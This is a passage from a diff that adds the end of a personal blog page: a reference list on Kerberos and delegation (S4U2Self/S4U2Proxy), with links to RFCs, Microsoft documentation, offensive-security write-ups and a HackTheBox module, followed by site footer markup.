+<li><a href="https://www.ietf.org/rfc/rfc4120.txt">https://www.ietf.org/rfc/rfc4120.txt</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/secgloss/s-gly">https://learn.microsoft.com/en-us/windows/win32/secgloss/s-gly</a></li>
+</ul>
+<p>Delegation and SFU (S4U2Self &amp; S4U2Proxy)</p>
+<ul>
+<li><a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/configure-kerberos-delegation-group-managed-service-accounts</a></li>
+<li><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/enable-computer-and-user-accounts-to-be-trusted-for-delegation</a></li>
+<li><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6a8dfc0c-2d32-478a-929f-5f9b1b18a169">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6a8dfc0c-2d32-478a-929f-5f9b1b18a169</a></li>
+<li><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a</a></li>
+</ul>
+<p>Additional Readings</p>
+<ul>
+<li><a href="https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61">https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61</a></li>
+</ul>
+<p>HackTheBox’s module on Kerberos Attacks</p>
+<ul>
+<li><a href="https://academy.hackthebox.com/module/25/section/137">https://academy.hackthebox.com/module/25/section/137</a></li>
+</ul>
+</div>
+</div>
+<!-- End of Post Content -->
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="#">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="#">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Eric Esquivel's Blog</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="/js/clean-blog.min.js"></script>
+
+
+</body>
+
+</html>
